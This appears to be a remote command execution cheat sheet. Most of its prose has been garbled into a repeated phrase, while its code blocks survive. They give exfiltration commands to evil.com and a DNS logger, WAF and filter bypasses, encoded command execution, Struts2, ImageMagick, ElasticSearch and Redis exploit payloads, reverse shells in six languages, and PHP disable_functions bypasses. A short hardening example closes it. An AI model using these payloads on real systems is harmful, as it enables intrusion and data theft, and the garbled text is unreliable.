# Web remote command execution testing guidance - remote command execution testing guidance（RCE）

> remote command execution testing guidance: WooYun remote command execution testing guidance（6,826 RCE remote command execution testing guidance）| remote command execution testing guidance web-injection.md

## remote command execution testing guidance、remote command execution testing guidance

### 3.1 remote command execution testing guidance

```
remote command execution testing guidance(remote command execution testing guidance) -> remote command execution testing guidance -> remote command execution testing guidance/remote command execution testing guidance -> OSremote command execution testing guidance
```

**remote command execution testing guidance**：remote command execution testing guidance = remote command execution testing guidance + remote command execution testing guidance（Shell/remote command execution testing guidance/remote command execution testing guidance）

### 3.2 remote command execution testing guidance

#### remote command execution testing guidance

| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
|---------|------|---------|
| remote command execution testing guidance | 68% | remote command execution testing guidance、remote command execution testing guidance、remote command execution testing guidance |
| remote command execution testing guidance | 62% | exec/system/shell_exec |
| Struts2remote command execution testing guidance | 50% | OGNLremote command execution testing guidance |
| SSRF | 30% | URLremote command execution testing guidance |
| pingremote command execution testing guidance | 26% | remote command execution testing guidance |
| remote command execution testing guidance | 24% | ImageMagick |
| Javaremote command execution testing guidance | 20% | WebLogic/JBoss |

#### remote command execution testing guidance

| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
|------|------|---------|
| `;` | remote command execution testing guidance | remote command execution testing guidance，remote command execution testing guidance |
| `\|` | remote command execution testing guidance | remote command execution testing guidance |
| `` ` `` / `$()` | remote command execution testing guidance | remote command execution testing guidance |
| `\|\|` | remote command execution testing guidance | remote command execution testing guidance |
| `&&` | remote command execution testing guidance | remote command execution testing guidance |
| `%0a` / `%0d%0a` | remote command execution testing guidance | URLremote command execution testing guidance |

#### remote command execution testing guidance

```bash
# DNSLogremote command execution testing guidance
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTPremote command execution testing guidance
curl https://evil.com/ d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# remote command execution testing guidance
sleep 5
ping -c 5 127.0.0.1

# remote command execution testing guidanceWebremote command execution testing guidance
echo "test" > /var/www/html/proof.txt
```

### 3.3 remote command execution testing guidance

#### remote command execution testing guidance

```bash
cat${IFS}/etc/passwd          # ${IFS}remote command execution testing guidance
cat$IFS$9/etc/passwd          # $9remote command execution testing guidance
cat%09/etc/passwd             # Tabremote command execution testing guidance
cat</etc/passwd               # remote command execution testing guidance
{cat,/etc/passwd}             # remote command execution testing guidance
```

#### remote command execution testing guidance

```bash
# remote command execution testing guidance/remote command execution testing guidance
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# remote command execution testing guidance
a=c;b=at;$a$b /etc/passwd

# remote command execution testing guidance
/bin/ca* /etc/passwd
/bin/c t /etc/passwd
/   /  t /etc/passwd
```

#### catremote command execution testing guidance

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### remote command execution testing guidance

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 remote command execution testing guidancePayload

#### remote command execution testing guidance/remote command execution testing guidancePayload

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNLremote command execution testing guidance**：

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovyremote command execution testing guidance**：

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redisremote command execution testing guidanceSSHremote command execution testing guidance/Crontab**：

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# remote command execution testing guidancecrontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### remote command execution testing guidanceShellremote command execution testing guidance

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NCremote command execution testing guidance-eremote command execution testing guidance
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHPremote command execution testing guidance

| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
|-----|------|-----|
| L1remote command execution testing guidance | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHPremote command execution testing guidance |
| L2 Shellremote command execution testing guidance | `system()`, `passthru()`, `shell_exec()`, remote command execution testing guidance | remote command execution testing guidance |
| L3remote command execution testing guidance | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | remote command execution testing guidance |
| L4remote command execution testing guidance | `call_user_func()`, `array_map()` | remote command execution testing guidance |

#### PHP WAFremote command execution testing guidance

```php
// remote command execution testing guidance
$func = 'sys'.'tem'; $func('whoami');
// remote command execution testing guidance
$a='sys';$b='tem';($a.$b)('whoami');
// remote command execution testing guidance
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// remote command execution testing guidance
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functionsremote command execution testing guidance

| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
|-----|------|-----|
| LD_PRELOAD | remote command execution testing guidance，mail()remote command execution testing guidance.so | remote command execution testing guidance.so + mail()remote command execution testing guidance |
| Shellshock | Bash<=4.3remote command execution testing guidance | remote command execution testing guidanceBash |
| Apache Mod_CGI | .htaccessremote command execution testing guidanceCGIremote command execution testing guidance | Apache + AllowOverride |
| PHP-FPM/FastCGI | remote command execution testing guidancePHPremote command execution testing guidance | remote command execution testing guidanceFPMremote command execution testing guidance/SSRF |
| ImageMagick | delegateremote command execution testing guidance | remote command execution testing guidanceIMremote command execution testing guidance |
| Windows COM | WScript.Shellremote command execution testing guidance | Windows + COMremote command execution testing guidance |

**LD_PRELOADremote command execution testing guidance**：

```php
// remote command execution testing guidance.so（remote command execution testing guidancegeteuidremote command execution testing guidance，remote command execution testing guidancesystem()）
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()remote command execution testing guidancesendmailremote command execution testing guidance -> remote command execution testing guidance.so -> remote command execution testing guidance
```

### 3.5 remote command execution testing guidance

```php
// remote command execution testing guidance：remote command execution testing guidance + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- remote command execution testing guidance，remote command execution testing guidance
- remote command execution testing guidance（remote command execution testing guidance），remote command execution testing guidance
- `escapeshellarg()` + `escapeshellcmd()` remote command execution testing guidance
- remote command execution testing guidance + remote command execution testing guidance
- `disable_functions` remote command execution testing guidance（remote command execution testing guidance）
- remote command execution testing guidanceWebremote command execution testing guidance + remote command execution testing guidance/chrootremote command execution testing guidance
- remote command execution testing guidance（Struts2/WebLogic/ImageMagickremote command execution testing guidance）

---

